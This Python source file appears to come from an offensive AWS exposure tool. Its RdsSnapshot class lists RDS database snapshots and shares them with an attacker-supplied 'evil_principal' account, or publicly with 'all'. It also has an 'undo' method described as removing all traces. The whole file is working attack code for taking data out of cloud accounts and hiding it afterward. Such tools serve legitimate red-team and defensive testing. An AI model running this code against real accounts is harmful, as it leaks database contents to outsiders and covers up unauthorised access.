import logging
import boto3
import botocore
from abc import ABC
from botocore.exceptions import ClientError
from policy_sentry.util.arns import get_resource_path_from_arn, get_account_from_arn
from endgame.exposure_via_resource_policies.common import ResourceTypes
from endgame.exposure_via_sharing_apis.common import ResourceSharingApi, ResponseGetSharingApi
from endgame.shared.list_resources_response import ListResourcesResponse

logger = logging.getLogger(__name__)


class RdsSnapshot(ResourceSharingApi, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        self.service = "rds"
        self.resource_type = "snapshot"
        self.region = region
        self.current_account_id = current_account_id
        self.name = name
        super().__init__(name, self.resource_type, self.service, region, client, current_account_id)

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.resource_type}/{self.name}"

    def _get_shared_with_accounts(self) -> ResponseGetSharingApi:
        logger.debug("Getting snapshot status policy for %s" % self.arn)
        shared_with_accounts = []
        try:
            response = self.client.describe_db_snapshot_attributes(
                DBSnapshotIdentifier=self.name
            )
            attributes = response.get("DBSnapshotAttributesResult").get("DBSnapshotAttributes")
            for attribute in attributes:
                if attribute.get("AttributeName") == "restore":
                    shared_with_accounts.extend(attribute.get("AttributeValues"))
                    break
            success = True
        except botocore.exceptions.ClientError:
            success = False
        response_message = ResponseGetSharingApi(shared_with_accounts=shared_with_accounts, success=success,
                                                 evil_principal="", victim_resource_arn=self.arn,
                                                 resource_name=self.name, resource_type=self.resource_type,
                                                 service=self.service,
                                                 original_policy=shared_with_accounts,
                                                 updated_policy=[]
                                                 )
        return response_message

    def share(self, accounts_to_add: list, accounts_to_remove: list) -> ResponseGetSharingApi:
        shared_with_accounts = []
        if accounts_to_add:
            logger.debug(f"Sharing the snapshot {self.name} with the accounts {', '.join(accounts_to_add)}")
        if accounts_to_remove:
            logger.debug(f"Removing access to snapshot {self.name} for the accounts {', '.join(accounts_to_add)}")
        try:
            snapshot_attributes_response = self.client.modify_db_snapshot_attribute(
                DBSnapshotIdentifier=self.name,
                AttributeName='restore',
                ValuesToAdd=accounts_to_add,
                ValuesToRemove=accounts_to_remove
            )
            attributes = snapshot_attributes_response.get("DBSnapshotAttributesResult").get("DBSnapshotAttributes")
            for attribute in attributes:
                if attribute.get("AttributeName") == "restore":
                    shared_with_accounts.extend(attribute.get("AttributeValues"))
                    break
            success = True
        except botocore.exceptions.ClientError:
            success = False
        response_message = ResponseGetSharingApi(shared_with_accounts=shared_with_accounts, success=success,
                                                 evil_principal="", victim_resource_arn=self.arn,
                                                 resource_name=self.name, resource_type=self.resource_type,
                                                 service=self.service,
                                                 original_policy=self.original_shared_with_accounts,
                                                 updated_policy=self.original_shared_with_accounts
                                                 )
        return response_message

    def add_myself(self, evil_principal: str, dry_run: bool = False) -> ResponseGetSharingApi:
        """Add your rogue principal to the AWS resource"""
        evil_account_id = self.parse_evil_principal(evil_principal=evil_principal)
        logger.debug(f"Sharing {self.arn} with {evil_account_id}")
        shared_with_accounts = []
        if not dry_run:
            accounts_to_add = [evil_account_id]
            share_response = self.share(accounts_to_add=accounts_to_add, accounts_to_remove=[])
            shared_with_accounts = share_response.shared_with_accounts
            success = share_response.success
        else:
            try:
                # this is just to get the success message
                tmp = self._get_shared_with_accounts()
                success = tmp.success
                shared_with_accounts = tmp.shared_with_accounts
                shared_with_accounts.append(evil_account_id)
            except botocore.exceptions.ClientError as error:
                logger.debug(error)
                success = False
        response_message = ResponseGetSharingApi(shared_with_accounts=shared_with_accounts, success=success,
                                                 evil_principal=evil_principal, victim_resource_arn=self.arn,
                                                 resource_name=self.name, resource_type=self.resource_type,
                                                 service=self.service,
                                                 original_policy=self.original_shared_with_accounts,
                                                 updated_policy=shared_with_accounts
                                                 )
        return response_message

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseGetSharingApi:
        """Remove all traces"""
        evil_account_id = self.parse_evil_principal(evil_principal=evil_principal)
        logger.debug(f"Removing {evil_account_id} access to {self.arn}")
        shared_with_accounts = []
        if not dry_run:
            accounts_to_remove = [evil_account_id]
            share_response = self.share(accounts_to_add=[], accounts_to_remove=accounts_to_remove)
            shared_with_accounts = share_response.shared_with_accounts
            success = share_response.success
        else:
            shared_with_accounts = self.shared_with_accounts
            if evil_account_id in shared_with_accounts:
                shared_with_accounts.remove(evil_account_id)
            success = True
        response_message = ResponseGetSharingApi(shared_with_accounts=shared_with_accounts, success=success,
                                                 evil_principal=evil_principal, victim_resource_arn=self.arn,
                                                 resource_name=self.name, resource_type=self.resource_type,
                                                 service=self.service,
                                                 original_policy=self.original_shared_with_accounts,
                                                 updated_policy=shared_with_accounts
                                                 )
        return response_message

    def parse_evil_principal(self, evil_principal: str) -> str:
        if ":" in evil_principal:
            evil_account_id = get_account_from_arn(evil_principal)
        # RDS requires publicly shared snapshots to be supplied via the value "all"
        elif evil_principal == "*":
            evil_account_id = "all"
        # Otherwise, the evil_principal is an account ID
        else:
            evil_account_id = evil_principal
        return evil_account_id


class RdsSnapshots(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "rds"
        self.resource_type = "snapshot"

    @property
    def resources(self) -> [ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []
        paginator = self.client.get_paginator("describe_db_snapshots")
        page_iterator = paginator.paginate()
        for page in page_iterator:
            these_resources = page["DBSnapshots"]
            for resource in these_resources:
                snapshot_identifier = resource.get("DBSnapshotIdentifier")
                instance_identifier = resource.get("DBInstanceIdentifier")
                arn = resource.get("DBSnapshotArn")
                snapshot_name = get_resource_path_from_arn(arn)
                # arn:${Partition}:rds:${Region}:${Account}:snapshot:${SnapshotName}
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=snapshot_name)
                resources.append(list_resources_response)
        return resources
